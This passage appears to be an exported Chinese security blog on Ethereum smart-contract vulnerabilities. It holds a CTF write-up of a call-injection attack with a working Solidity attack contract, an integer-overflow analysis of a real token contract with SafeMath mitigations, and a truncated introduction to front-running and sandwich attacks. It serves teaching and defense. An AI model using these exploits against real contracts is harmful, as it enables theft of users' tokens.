alt=""></p><blockquote><p>总的来说</p><ol><li>Call函数自由度过大，应谨慎使用作为底层函数，对于一些敏感操作或者权限判断函数，则不要轻易将合约自身的账户地址作为可信的地址。</li><li>调用的函数应该做严格的限制，避开调用任意函数的隐患</li><li>用到类似ERC223推荐实现的custom_fallback和ds-auth的合约，或者说内置有其他权限控制得合约的以太坊Token，很可能也存在这个call的注入问题</li></ol></blockquote><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>通过以上的介绍，想必大家对call函数以及其漏洞已经有了自己的理解。<br/><br>call函数出现在底层合约中需要格外重视，如非必要最好不要用，用new代替。<br/><br>call注入的主要攻击思路：</p><blockquote><p>由于call参数类型不限，这给了参数很大的自由度，黑客可以通过构造参数去调用与此合约相关联的所有方法，并且在调用时msg.sender的值会变为合约的地址，这可能会绕过关键函数的一些判断条件，从而使黑客通过”冒名调用”获得利益。</p></blockquote><h2 id="靶场题目："><a href="#靶场题目：" class="headerlink" title="靶场题目："></a>靶场题目：</h2><p>说了这么多，让我们回到问题的起点：<br>漏洞源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">contract Vuln&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    string public name     &#x3D; &quot;Chain&quot;;</span><br><span class="line">    string public symbol   &#x3D; &quot;CHA&quot;;</span><br><span class="line">    uint8  public decimals &#x3D; 18;</span><br><span class="line">    uint public totalSupply&#x3D;10000000000;</span><br><span class="line">    bool  public isLoan&#x3D;false;</span><br><span class="line">    bool public solved;</span><br><span class="line">    event  Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Deposit(address indexed to, uint number);</span><br><span class="line">    event  Withdrawal(address indexed from, uint number);</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; uint)                       public  balanceOf;</span><br><span class="line">    mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint))  public  allowance;</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        owner&#x3D;msg.sender;</span><br><span class="line">        balanceOf[owner]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">        balanceOf[address(this)]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; number);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; number;</span><br><span class="line">        (msg.sender).transfer(number);</span><br><span class="line">        emit Withdrawal(msg.sender, number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][to] &#x3D; number;</span><br><span class="line">        emit Approval(msg.sender, to, number);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">        balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint number)</span><br><span class="line">        public</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; number);</span><br><span class="line"></span><br><span class="line">        if (from !&#x3D; msg.sender &amp;&amp; allowance[from][msg.sender] !&#x3D; 2**256-1) &#123;</span><br><span class="line">            require(allowance[from][msg.sender] &gt;&#x3D; number);</span><br><span class="line">            allowance[from][msg.sender] -&#x3D; number;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; number;</span><br><span class="line">        balanceOf[to] +&#x3D; number;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, number);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public returns(bool)&#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete() public &#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">        require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">        solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>拿到flag的要求是使isSolved()返回true</strong><br>读完源码后，发现题目要我们通过攻击达成<code>complete()</code>函数里的两个限制条件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function complete() public &#123;</span><br><span class="line"></span><br><span class="line">       require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">       require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">       solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>即是让我们利用漏洞从合约成功盗取10000以上的token<br/><br>让我们把视线放到<code>fakeflashloan()</code>这个奇怪的函数上，可以注意到这个函数并没有很苛刻的“准入条件”，让我们可以很轻松的执行到里面的call方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>而call后面跟的参数是bytes类型的data,这就给了我们很大的操作空间。此时我至少想到了两种拿到flag的方式，一种是通过call注入调用transfer和approve函数给我自己转账，实现盗币后执行<code>complete()</code>方法。另一种方式比较投机取巧，通过call注入调用approve函数，<code>_to</code>填合约地址，这样allowance就记录了一个合约自己给自己的一笔token的approve，同样可以绕开complete的两个限制条件拿到flag<br/><br>但是我觉得题目的初衷应该是要我们完成盗币攻击，于是将其实现，攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">import&quot;.&#x2F;Vuln.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line"></span><br><span class="line">    Vuln cont;</span><br><span class="line">    </span><br><span class="line">    constructor(address _adr)&#123;</span><br><span class="line">        cont &#x3D; Vuln(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bytes memory byt;</span><br><span class="line">        bytes memory byt2;</span><br><span class="line">        address adr&#x3D;0x100200fF289D4dA0634fF36d7f5D96524f7EFf67;&#x2F;&#x2F;我的账户地址</span><br><span class="line">        byt  &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        byt2 &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;approve(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt);&#x2F;&#x2F;transfer 10001个token给我</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt2);&#x2F;&#x2F;approve 10001个token的approve给我</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意：原题中用到了solidity7.0版本的编译环境，在新版的solidity中攻击合约中<code>bytes32(adr),bytes32(10001)</code>的语法是不被允许的,所以我直接选择了用更低版本的暂时替代。</p><blockquote><p>PS：有关新版本的写法我会在后续更新</p></blockquote><p>在这里我们通过调用<code>fakeflashloan()</code>这个问题函数，构造了<code>byt</code>和<code>byt2</code>这样的bytes去实现call注入的函数调用。</p><p>构造这个bytes占了我解题时常的90％，一直攻击无效，因为这个靶场测试网没办法debug,给我带来了很多困难。最终我选择脱离靶场的测试网环境，在本地进行测试。<br/><br>有关bytes的构造大家可以参考<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html?highlight=abi" target="_blank" rel="noopener">solidity的abi参考文档</a><br><img src="/abi.png" alt=""></p><h1 id="攻击效果："><a href="#攻击效果：" class="headerlink" title="攻击效果："></a>攻击效果：</h1><p>夺旗：<br><img src="/CallFlag.png" alt=""><br>合约被攻击后：<br><img src="/suc1.png" alt=""><br><img src="/suc2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OverflowAttack</title>
      <link href="/OverflowAttack/"/>
      <url>/OverflowAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在介绍溢出攻击前，让我们先来了解一下solidity中溢出和下溢。</p><ul><li>溢出<br>  假设我们有一个 uint8, 只能存储8 bit数据。这意味着我们能存储的最大数字就是二进制 11111111 (或者说十进制的 2^8 - 1 = 255).<br/><br>  来看看下面的代码。最后 number 将会是什么值？<br/>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint8 number &#x3D; 255;</span><br><span class="line">number++; &#x2F;&#x2F;number &#x3D; 0</span><br></pre></td></tr></table></figure>  在这个例子中，我们导致了溢出 — 虽然我们加了1， 但是number 出乎意料地等于 0了。<br/><br>  <img src="overflow1.png" alt=""><br>  下溢(underflow)也类似，如果你从一个等于 0 的 uint8 减去 1, 它将变成 255 (因为 uint 是无符号的，其不能等于负数)。<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>上述就是在solidity中，数据溢出的原理，那么在智能合约中，由于合约代码考虑不规范，可能会导致合约数据溢出漏洞，下来举例一个在以太坊公链中有数据溢出BUG的合约代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Hexagon &#123;</span><br><span class="line">&#x2F;* Main information *&#x2F;</span><br><span class="line">string public constant name &#x3D; &quot;Hexagon&quot;;</span><br><span class="line">string public constant symbol &#x3D; &quot;HXG&quot;;</span><br><span class="line">uint8 public constant decimals &#x3D; 4;</span><br><span class="line">uint8 public constant burnPerTransaction &#x3D; 2;</span><br><span class="line">uint256 public constant initialSupply &#x3D; 420000000000000;</span><br><span class="line">uint256 public currentSupply &#x3D; initialSupply;</span><br><span class="line"></span><br><span class="line">&#x2F;* Create array with balances *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">&#x2F;* Create array with allowance *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">&#x2F;* Constructor *&#x2F;</span><br><span class="line">function Hexagon() public &#123;</span><br><span class="line">    &#x2F;* Give creator all initial supply of tokens *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] &#x3D; initialSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* PUBLIC *&#x2F;</span><br><span class="line">&#x2F;* Send tokens *&#x2F;</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    _transfer(msg.sender, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Return current supply *&#x2F;</span><br><span class="line">function totalSupply() public constant returns (uint) &#123;</span><br><span class="line">    return currentSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Burn tokens *&#x2F;</span><br><span class="line">function burn(uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">    &#x2F;* Send to the black hole *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(msg.sender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Allow someone to spend on your behalf *&#x2F;</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has already  *&#x2F;</span><br><span class="line">    require(_value &#x3D;&#x3D; 0 || allowance[msg.sender][_spender] &#x3D;&#x3D; 0);</span><br><span class="line">    &#x2F;* Add to allowance  *&#x2F;</span><br><span class="line">    allowance[msg.sender][_spender] &#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Transfer tokens from allowance *&#x2F;</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Prevent transfer of not allowed tokens *&#x2F;</span><br><span class="line">    require(allowance[_from][msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Remove tokens from allowance *&#x2F;</span><br><span class="line">    allowance[_from][msg.sender] -&#x3D; _value;</span><br><span class="line"></span><br><span class="line">    _transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* INTERNAL *&#x2F;</span><br><span class="line">function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">    &#x2F;* Prevent transfer to 0x0 address. Use burn() instead  *&#x2F;</span><br><span class="line">    require (_to !&#x3D; 0x0);</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    &#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">    require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br><span class="line">    &#x2F;* Check for overflows *&#x2F;</span><br><span class="line">    require (balanceOf[_to] + _value &gt; balanceOf[_to]);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[_from] -&#x3D; _value + burnPerTransaction;</span><br><span class="line">    &#x2F;* Add the same to the recipient *&#x2F;</span><br><span class="line">    balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Apply transaction fee *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(_from, burnPerTransaction);</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Events *&#x2F;</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">event Burn(address indexed from, uint256 value);</span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在合约的转账代码 function _transfer(address _from, address _to, uint _value) internal 实现中，判断转账支付方账户是否具有足够的余额，有如下的判断语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure>加入攻击者给<code>_value</code>一个很大的值，那么在加上<code>burnPerTransaction</code>后很可能会发生溢出，相加后的结果很小，导致<code>require</code>发生错误的判断。结果给接收方地址增加一笔非常大的TOKEN。下面将举个例子说明：<blockquote><p>假设合约中 burnPerTransaction = 0xf ，<br>所以当转账_value为0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0时，<br>_value + burnPerTransaction =0 ，即可成功攻击，为balanceOf[_to]增加大量代币。</p></blockquote></li></ul><h1 id="漏洞避免"><a href="#漏洞避免" class="headerlink" title="漏洞避免"></a>漏洞避免</h1><ul><li><p>该段代码安全的写法应该是这样的：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require (balanceOf[_from] &gt;&#x3D; _value );</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; burnPerTransaction);</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure></li><li><p><strong>使用SafeMath</strong><br>  为了避免溢出和下溢的情况，OpenZeppelin 建立了一个叫做 SafeMath 的 库(library)，默认情况下可以防止这些问题。<br>  一个库 是 Solidity 中一种特殊的合约。其中一个有用的功能是给原始数据类型增加一些方法。<br/><br>  比如，使用 SafeMath 库的时候，我们将使用 using SafeMath for uint256 这样的语法。 SafeMath 库有四个方法 — add， sub， mul， 以及 div。现在我们可以这样来让 uint256 调用这些方法：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">uint256 a &#x3D; 5;</span><br><span class="line">uint256 b &#x3D; a.add(3); &#x2F;&#x2F; 5 + 3 &#x3D; 8</span><br><span class="line">uint256 c &#x3D; a.mul(2); &#x2F;&#x2F; 5 * 2 &#x3D; 10</span><br></pre></td></tr></table></figure><p>  我们注意到了一个不常见的语法<code>using···for···</code>这是因为SafeMath源码使用了library关键字，库允许我们使用 using 关键字，它可以自动把库的所有方法添加给一个数据类型。<br/><br>  我们来看一下SafeMath的源码：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    if (a &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 c &#x3D; a * b;</span><br><span class="line">    assert(c &#x2F; a &#x3D;&#x3D; b);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    &#x2F;&#x2F; assert(b &gt; 0); &#x2F;&#x2F; Solidity automatically throws when dividing by 0</span><br><span class="line">    uint256 c &#x3D; a &#x2F; b;</span><br><span class="line">    &#x2F;&#x2F; assert(a &#x3D;&#x3D; b * c + a % b); &#x2F;&#x2F; There is no case in which this doesn&#39;t hold</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    assert(b &lt;&#x3D; a);</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c &#x3D; a + b;</span><br><span class="line">    assert(c &gt;&#x3D; a);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  解释一下源码中的<code>assert</code></p><blockquote><p>assert 和 require 相似，若结果为否它就会抛出错误。 assert 和 require 区别在于，require 若失败则会返还给用户剩下的 gas， assert则不会。所以大部分情况下，你写代码的时候会比较喜欢 require，assert 只在代码可能出现严重错误的时候使用，比如 uint 溢出。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Front-Running</title>
      <link href="/Front-Running/"/>
      <url>/Front-Running/</url>
      
        <content type="html"><![CDATA[<h1 id="抢先交易攻击（Front-Running）"><a href="#抢先交易攻击（Front-Running）" class="headerlink" title="抢先交易攻击（Front-Running）"></a>抢先交易攻击（Front-Running）</h1><hr><blockquote><p>author：Thomas_Xu</p></blockquote><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑机器人通过设置更高 Gas 费用抢先完成攻击交易，以此攫取用户利益的攻击行为。而 Mempool（交易池） 是一组已经广播到网络中并等待被打包进区块的以太坊交易，它是 Front-Running 可以实施的前提，抢跑机器人通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标。</p></blockquote><p><br /><br>在所有 Front-Running 中，最典型最具危害性的就是针对 AMM(自由做市商) 交易的 Sandwich Attacks （三明治攻击），除此以外还有针对套利、清算交易、闪电贷等利用系统漏洞获利的抢跑攻击，攻击者数量众多，且由自动化脚本控制，永远不知疲倦，因此任何有利可图的交易都会遭受他们的饱和攻击，几乎没有幸免的可能。<br/></p><ul><li><strong>Sandwich Attacks</strong><br>首先我们来看一个真实的三明治攻击案例：<br><img src="Uniswap3.png" alt=""><br>上图可见，三笔交易在同一个区块被打包，两笔攻击交易（打上了黑客标记的）中间夹着一笔正常交易。其具体流程如下：<blockquote><ol><li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li><li>抢跑机器人检测到这笔有利可图的交易后，随即展开攻击，发起一笔买入交易，设定 GasPrice 为 49.9Gwei，凭借 Gas 竞争机制成功抢跑用户的正常交易；</li><li>与此同时，机器人发出另一笔卖出交易，设置 GasPrice 同样为 40.5Gwei，因为时间顺序的原因，紧贴着用户正常交易完成。</li></ol></blockquote></li></ul><p>一次完美的抢跑攻击完成，算上手续费，机器人共赚取 16448.012-16310.3-15.2-10.61 = $111.9，而这种两笔攻击交易夹着一笔正常交易的攻击，就被形象的称为三明治攻击。</p><h2 